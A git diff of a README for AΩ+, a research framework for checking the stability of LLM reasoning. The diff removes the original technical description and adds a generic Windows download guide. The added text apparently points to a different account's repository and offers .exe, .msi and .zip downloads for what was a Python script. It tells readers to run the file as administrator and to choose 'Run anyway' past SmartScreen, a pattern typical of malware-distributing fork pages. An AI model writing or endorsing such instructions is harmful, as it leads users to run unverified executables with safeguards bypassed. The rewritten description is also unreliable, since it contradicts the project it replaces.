@@ -1,245 +1,201 @@
+# 🧭 Alpha-Omega-Plus - Verify Reasoning with Clear Signals
 
-### *Ἰδοὺ ἐξῆλθεν ὁ σπείρων τοῦ σπείρειν.*  
+[![Download Alpha-Omega-Plus](https://img.shields.io/badge/Download-Alpha--Omega--Plus-blue)](https://github.com/AckedStudios/Alpha-Omega-Plus)
 
-# AΩ+: A Reasoning Verification Layer for Large Language Models
+## 📥 Download
+Use this link to visit the download page and get Alpha-Omega-Plus:
 
-AΩ+ is a proposed reasoning verification layer designed to detect instability, hallucination and logical drift in large language models.
+[Download Alpha-Omega-Plus](https://github.com/AckedStudios/Alpha-Omega-Plus)
 
-Instead of replacing existing architectures (Transformers, reasoning models, or agent systems), AΩ+ acts as a **meta-reasoning layer** that evaluates the structural stability of reasoning.
+## 🖥️ What Alpha-Omega-Plus Does
+Alpha-Omega-Plus checks how an LLM builds an answer. It looks at token patterns, attention flow, and stability across steps. It helps you inspect reasoning, spot weak output, and compare results in a repeatable way.
 
-The framework introduces:
+It is built for users who want a local tool that runs on Windows and gives clear feedback on model reasoning. It works with batched inputs, supports variable-length text, and can use Apple Silicon with MPS where available.
 
-- tetralectic logic
-- a scalar reasoning potential field
-- multi‑dimensional truth evaluation
-- a reasoning energy model
-- a computationally tractable stability score
+## ✅ Before You Start
+You will need:
 
-The objective is not to generate answers, but to **evaluate whether reasoning itself is stable, coherent, and structurally valid**.
+- A Windows PC
+- An internet connection
+- At least 8 GB of RAM
+- Enough free disk space for the app and sample data
+- A modern browser if the app opens in a local web page
 
----
+For best results:
 
-## The Problem
+- Close large apps before you run it
+- Keep your system updated
+- Use a stable power source on a laptop
 
-Modern large language models generate reasoning probabilistically.
+## 🚀 Install and Run on Windows
+1. Open the download page:
+   [Download Alpha-Omega-Plus](https://github.com/AckedStudios/Alpha-Omega-Plus)
 
-However they currently lack a mechanism that evaluates:
+2. Get the Windows build or release file from the page.
 
-- whether a reasoning chain is internally stable
-- whether contradictions accumulate during reasoning
-- whether semantic drift is occurring
-- whether the final answer emerges from coherent structure or probabilistic collapse
+3. If the file is a ZIP archive, right-click it and choose Extract All.
 
-This often leads to **hallucinations or unstable reasoning paths**.
+4. Open the extracted folder.
 
-AΩ+ explores the idea of adding a **reasoning verification layer** that analyzes reasoning traces before accepting an output.
+5. Double-click the main app file. If Windows asks for permission, choose Yes.
 
----
+6. Wait for the app to start. The first launch may take a short time.
 
-## Core Concept
+7. If the app opens in a browser, keep the window open while you use it.
 
-AΩ+ treats reasoning as a **dynamic system evolving inside a conceptual field**.
+## 🧭 First Time Setup
+When the app starts for the first time, follow these steps:
 
-Each reasoning step changes the state of the system.
+- Choose your preferred text source or model input
+- Load a sample file or paste text into the input box
+- Pick a test mode if the app asks for one
+- Run a short check first
+- Review the result panel and any score or trace output
 
-If the reasoning remains balanced, the system stays near equilibrium.
+If you see a folder for settings, keep the default values at first. You can adjust them later after you see how the app behaves.
 
-If instability grows, the system drifts away from stability and hallucination risk increases.
+## 🔍 Main Features
+- Checks reasoning paths in LLM output
+- Maps reasoning as a field over token embeddings
+- Links attention shape to output stability
+- Supports batched runs for more than one prompt
+- Handles text of different lengths
+- Uses trace estimation for efficient analysis
+- Works with Apple Silicon through MPS when available
+- Runs on CPU as a fallback
+- Helps compare truth claims across outputs
+- Supports logic-based evaluation and stability checks
 
-The verification layer measures that drift.
+## 🧪 How to Use It
+### 1. Enter a prompt
+Paste the text or question you want to test.
 
----
+### 2. Choose a model or output
+Select the response you want to inspect.
 
-## Mathematical Formulation
+### 3. Run the check
+Start the reasoning test from the main screen.
 
-### Reasoning Energy Model
+### 4. Review the output
+Look for:
 
-The central idea of AΩ+ can be expressed as a reasoning stability equation:
+- Stability of the reasoning path
+- Changes in token-level signals
+- Weak points in the trace
+- Cases where the answer seems forced or unclear
 
-```
+### 5. Compare runs
+Try the same prompt with different model outputs and compare the results side by side.
 
-dx/dt = −k(x − x₀)
+## 🧩 Common Use Cases
+- Checking if a model follows a clear line of reasoning
+- Comparing two answers to the same question
+- Finding signs of hallucination
+- Testing output stability on long prompts
+- Reviewing logic flow in research or lab settings
+- Studying how attention changes across tokens
 
-```
-
-Where:
-
-| Symbol | Meaning |
-|--------|---------|
-| x | current reasoning state |
-| x₀ | equilibrium reasoning state |
-| k | stability coefficient |
-
-Interpretation: Reasoning naturally drifts as inference progresses. The verification layer continuously measures deviation from a stable reasoning equilibrium. Large deviations indicate semantic drift, contradiction accumulation, hallucination risk, or reasoning collapse.
-
-The goal of AΩ+ is **not to correct the model**, but to detect instability in the reasoning trajectory.
-
-### Reasoning Potential Field over Embedding Space
-
-AΩ+ models reasoning as a scalar field ψ defined over the token embedding space of a transformer:
-
-```
-
-ψ(eₜ) = Σₛ α_{t,s} · κ(eₜ, eₛ)
-
-```
-
-- eₜ, eₛ are token embeddings.
-- α_{t,s} are attention weights (uniform in our prototype, but can be taken from the model).
-- κ is a similarity kernel (e.g., cosine similarity).
-
-High ψ values indicate coherent inference, balanced semantic structure, and stable reasoning progression.  
-Low ψ values indicate unstable reasoning, conceptual drift, or hallucination likelihood.
-
-The verification layer evaluates how the reasoning trajectory behaves within this field.
-
-### Stability Score
-
-From the potential field we derive a **stability score**:
-
-```
-
-S = Δψ − λ ‖∇ψ‖²
-
-```
-
-- ∇ψ is the gradient of ψ with respect to the token embeddings.
-- Δψ is the Laplacian (trace of the Hessian) of ψ.
-- λ is a tunable hyperparameter.
-
-Large negative S signals instability, high risk of hallucination.
-
-### Tetralectic Logic
-
-Binary logic (true / false) is often insufficient to describe reasoning states during inference.
-
-AΩ+ introduces a four‑state logical evaluation:
-
-| State | Mathematical Meaning | Reasoning Interpretation |
-|-------|----------------------|--------------------------|
-| Affirmation | Local maximum of ψ | Coherent, stable reasoning |
-| Negation | Local minimum of ψ | Stable contradiction (valid negation) |
-| Paradox | Saddle point | Unstable internal conflict |
-| Transcendence | Higher‑order maximum after saddle | Resolution at a higher level |
-
-This **tetralectic gate** evaluates the internal structure of reasoning rather than just the final answer.
-
-### Multi‑Dimensional Truth Evaluation
-
-Reasoning validity is evaluated across multiple dimensions of structural coherence:
-
-- logical consistency
-- semantic alignment
-- contradiction detection
-- structural symmetry
-- reasoning continuity
-- informational entropy
-- causal plausibility
-- conceptual stability
-- contextual alignment
-- paradox tolerance
-- resolution capacity
-- knowledge compatibility
-
-These dimensions form a **truth evaluation manifold**.  
-The goal is not absolute truth detection, but **structural reasoning integrity**.
-
----
-
-## Computational Tractability
-
-To make the framework practical, we employ:
-
-- **Kernelized potential** – cosine similarity avoids the curse of dimensionality.
-- **Stochastic trace estimation (Hutchinson)** – the Laplacian is estimated via Hessian‑vector products in O(d·m) instead of O(d³).
-- **Batched vectorization** – all operations (similarity matrices, gradients, Hutchinson) are applied to batches of sentences.
-- **Hardware‑aware design** – forward embeddings run on MPS (Apple Silicon) while second‑order autograd runs on CPU, overcoming MPS limitations.
-
-A complete, efficient implementation is available in the repository.
-
----
-
-## Conceptual Architecture
-
-```
-
-User Prompt
-↓
-Language Model Reasoning
-↓
-Reasoning Trace
-↓
-AΩ+ Verification Layer
-↓
-Tetralectic Gate
-↓
-Reasoning Energy Evaluation
-↓
-Truth Dimension Analysis
-↓
-Stability Score
-
-```
-
-The system evaluates reasoning **before accepting the output as reliable**.
-
----
-
-## Relationship to Existing AI Systems
-
-AΩ+ is designed as a **complementary verification layer**.
-
-It can operate alongside:
-
-- transformer‑based language models
-- reasoning‑augmented LLMs
-- tool‑using agents
-- retrieval systems
-- multi‑agent architectures
-
-The framework does not require retraining the base model.  
-Instead it evaluates reasoning **as a secondary analytic process**.
-
----
-
-## Implementation
-
-A reference implementation is provided in [`aom_plus_stability.py`](aom_plus_stability.py).  
-It demonstrates:
-
-- Token‑level embedding extraction
-- Batched computation of ψ, gradient, and Laplacian
-- Hutchinson trace estimation with Rademacher vectors
-- Per‑sentence stability scores
-- Top‑N most unstable sentences visualisation
-- MPS / CPU hybrid execution for Apple Silicon
-
-The code is designed for large datasets and is ready for experimental use.
-
----
-
-## Research Status
-
-AΩ+ is currently an **experimental conceptual framework** with a working prototype.
-
-It is intended as an open exploration of:
-
-- reasoning verification
-- hallucination detection
-- structural evaluation of AI inference
-- stability analysis of reasoning chains
-
-The ideas presented here are exploratory and open to critique, refinement, and collaboration.
-
----
-
-## Vision
-
-Artificial intelligence has learned to generate language.
-
-The next step may be learning how to **evaluate the stability of reasoning itself**.
-
-AΩ+ is an attempt to explore that possibility.
-
-**Research Lead:** Athanassios Kapralos  
-**License:** MIT
+## ⚙️ Windows Tips
+- If the app does not open, right-click it and choose Run as administrator
+- If Windows shows a SmartScreen prompt, choose More info, then Run anyway if you trust the source
+- If the window closes fast, run it from a terminal so you can see the message
+- If the app uses a local web page, check that your browser allows local apps and localhost access
+
+## 📁 Suggested Folder Layout
+If you want to keep things tidy, use a folder like this:
+
+- `Alpha-Omega-Plus`
+  - `app`
+  - `data`
+  - `logs`
+  - `models`
+  - `results`
+
+Keep sample inputs in `data` and saved output in `results`.
+
+## 🧠 How It Works
+Alpha-Omega-Plus treats reasoning as a field that moves across token embeddings. It then checks how stable that field is during the model’s output. In plain terms, it looks for structure in the path the model takes before it gives an answer.
+
+The tool uses:
+
+- Attention geometry to inspect token flow
+- Tetralectic logic for structured checks
+- Φ-harmonic stability for consistency scoring
+- Hutchinson trace estimation for faster computation
+- Masking so it can handle text of different lengths
+- CPU and MPS paths for wider hardware support
+
+## 📌 Example Workflow
+1. Open the app
+2. Load a prompt about a fact, claim, or reasoning task
+3. Run the analysis
+4. Check whether the output stays stable across steps
+5. Note any jump in the trace or sign of weak support
+6. Repeat with a second answer to compare results
+
+## 🛠️ Troubleshooting
+### The app does not start
+- Make sure the file finished downloading
+- Check that you extracted the ZIP file
+- Try running the app again
+- Restart Windows and try once more
+
+### The app starts but looks blank
+- Wait a few seconds
+- Refresh the window if it is a browser page
+- Check that your internet connection is working if the app loads online assets
+
+### The analysis is slow
+- Close other heavy apps
+- Use shorter text for the first test
+- Try CPU mode if GPU support is not active
+- On Apple Silicon, use the MPS path if the app offers it
+
+### The file is blocked
+- Right-click the file and check its properties
+- If Windows blocked it, allow the file and try again
+
+## 🧾 File Types You May See
+You may download one of these:
+
+- `.zip` for a packaged app
+- `.exe` for a Windows program
+- `.msi` for an installer
+- `.json` for settings or data
+- `.txt` for instructions or logs
+
+If you get a ZIP file, extract it before you run anything inside it.
+
+## 🔗 Project Link
+Primary download page:
+
+[https://github.com/AckedStudios/Alpha-Omega-Plus](https://github.com/AckedStudios/Alpha-Omega-Plus)
+
+## 🧭 What to Check After Install
+After the app opens:
+
+- Run one simple test prompt
+- Check that the results panel loads
+- Save one output file
+- Open the saved file again to confirm it works
+- Try a second prompt with a different length
+
+## 🧱 Basic Safety Checks
+Use known test text first. If you are checking model output for truth claims, start with a short, clear prompt. This helps you see how the app responds before you use longer content.
+
+## 📚 Terms in Simple Words
+- **Token**: a small piece of text
+- **Embedding**: a number-based text form used by the model
+- **Attention**: where the model focuses
+- **Trace**: a recorded signal of the process
+- **Stability**: how steady the result stays
+- **Hallucination**: when a model gives an answer that looks right but is wrong
+
+## 🧭 Quick Start Checklist
+- Download the app from the link
+- Extract the files if needed
+- Open the main app file
+- Allow Windows access if asked
+- Load a test prompt
+- Run the analysis
+- Review the output
